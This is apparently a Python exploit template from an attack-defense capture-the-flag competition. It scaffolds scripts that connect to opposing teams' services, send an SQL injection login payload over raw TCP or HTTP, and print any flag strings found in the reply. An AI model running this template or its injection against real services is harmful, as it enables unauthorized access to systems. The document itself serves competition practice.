# language: Python, file: exp_template.py, target: any TCP service
# Canonical exploit format. Every exploit your team writes follows this shape
# so the farm can run any of them unchanged.
#
# Usage:   python exp_template.py <target_ip> [port]
# Env (set by farm): TARGET_IP, TARGET_EXTRA (json list, e.g. flag_id/username)
#
# Contract: print every flag you find to stdout, one per line. Nothing else
# on stdout. Debug goes to stderr.

import os
import sys
import re
import json
import contextlib

# FLAG_RE must match the comp's format — set once here, every exploit inherits.
FLAG_RE = re.compile(rb"[A-Za-z0-9_]{0,10}\{[^}\n]{4,}\}")

HOST = sys.argv[1] if len(sys.argv) > 1 else os.getenv("TARGET_IP", "127.0.0.1")
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.getenv("TARGET_PORT", "8080"))
EXTRA = json.loads(os.getenv("TARGET_EXTRA", "[]"))


def get_flag_from_service(host, port, extra):
    """Your exploit logic. Returns bytes of response containing the flag.
    Error handling contract:
      - raise nothing: farm reads stdout only
      - any exception is caught by main() and reported to stderr with context
      - timeout is mandatory: a hung exploit burns a farm worker slot all tick
    """
    # ---- raw TCP version ----
    import socket
    s = socket.create_connection((host, port), timeout=5)
    s.settimeout(5)
    s.sendall(b"login user pass\n")          # handshake from benign Tulip flow
    s.sendall(b"' OR '1'='1\n")               # the bug
    out = b""
    with contextlib.suppress(socket.timeout):
        while len(out) < 65536:
            d = s.recv(4096)
            if not d:
                break
            out += d
    s.close()
    return out

    # ---- HTTP version (uncomment if the service is HTTP) ----
    # import urllib.request, urllib.parse
    # data = urllib.parse.urlencode({"user": "admin", "pass": "' OR '1'='1"}).encode()
    # req = urllib.request.Request(f"http://{host}:{port}/login", data=data)
    # return urllib.request.urlopen(req, timeout=6).read()


def main():
    try:
        out = get_flag_from_service(HOST, PORT, EXTRA)
    except Exception as e:
        # descriptive but machine-parsable: farm ignores stderr, humans read it
        print(f"exploit failed: target={HOST}:{PORT} cause={type(e).__name__}: {e}", file=sys.stderr)
        print("  hint: service down, patched, or protocol changed — check in Tulip", file=sys.stderr)
        return 1
    if not out:
        print("exploit returned empty response — target may be patched", file=sys.stderr)
        return 1
    found = False
    for m in FLAG_RE.finditer(out):
        print(m.group(0).decode())   # farm reads stdout
        found = True
    if not found:
        print(f"no flag pattern in {len(out)}B response — FLAG_RE may not match comp format", file=sys.stderr)
        print(f"  first bytes: {out[:120]!r}", file=sys.stderr)
    return 0 if found else 1


if __name__ == "__main__":
    sys.exit(main())